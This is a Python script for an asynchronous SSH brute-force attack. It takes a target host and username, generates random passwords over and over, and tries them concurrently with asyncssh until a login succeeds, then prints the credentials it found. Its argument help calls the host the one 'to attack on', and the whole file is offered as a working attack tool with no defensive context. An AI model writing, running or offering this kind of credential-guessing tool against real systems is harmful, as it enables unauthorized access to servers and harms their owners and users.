import asyncio
import asyncssh
import argparse
from termcolor import colored
from datetime import datetime
from os import path
from sys import exit
import random
import string


def get_args():
    """Function to get command-line arguments"""
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='Host to attack on e.g. 10.10.10.10.')
    parser.add_argument('-p', '--port', dest='port', default=22,
                        type=int, required=False, help="Port to attack on, Default:22")
    parser.add_argument('-u', '--username', dest='username',
                        required=True, help="Username with which to bruteforce")
    parser.add_argument('-l', '--length', dest='length', default=4,
                        type=int, required=False, help="Length of passwords to generate, Default: 4")
    arguments = parser.parse_args()

    return arguments


async def ssh_bruteforce(hostname, username, password, port, found_flag):
    """Takes password, username, port as input and checks for connection"""
    try:
        async with asyncssh.connect(hostname, username=username, password=password) as conn:
            found_flag.set()
            print(colored(
                f"[{port}] [ssh] host:{hostname}  login:{username}  password:{password}", 'green'))

    except Exception as err:
        print(f"[Attempt] target {hostname} - login:{username} - password:{password}")


def random_password(length):
    """Generate a random password of the given length using uppercase, lowercase, digits, and symbols."""
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))


async def main(hostname, port, username, length):
    """The Main function takes hostname, port, username, and password length."""
    tasks = []
    found_flag = asyncio.Event()
    concurrency_limit = 10
    counter = 0

    while not found_flag.is_set():
        password = random_password(length)

        if counter >= concurrency_limit:
            await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            tasks = []
            counter = 0

        if not found_flag.is_set():
            tasks.append(asyncio.create_task(ssh_bruteforce(
                hostname, username, password, port, found_flag)))

            await asyncio.sleep(0.5)
            counter += 1

    await asyncio.gather(*tasks)

    if not found_flag.is_set():
        print(colored("\n [-] Failed to find the correct password.", "red"))


if __name__ == "__main__":
    arguments = get_args()

    print("\n---------------------------------------------------------\n---------------------------------------------------------")
    print(colored(f"[*] Target\t: ", "light_red",), end="")
    print(arguments.target)
    print(colored(f"[*] Username\t: ", "light_red",), end="")
    print(arguments.username)

    print(colored(f"[*] Port\t: ", "light_red"), end="")
    print('22' if not arguments.port else arguments.port)

    print(colored(f"[*] Password Length\t: ", "light_red"), end="")
    print(arguments.length)

    print(colored(f"[*] Protocol\t: ", "light_red"), end="")
    print("SSH")

    print("---------------------------------------------------------\n---------------------------------------------------------", )

    print(colored(
        f"SSH-Bruteforce starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
    print("---------------------------------------------------------\n---------------------------------------------------------")

    asyncio.run(main(arguments.target, arguments.port,
                     arguments.username, arguments.length))
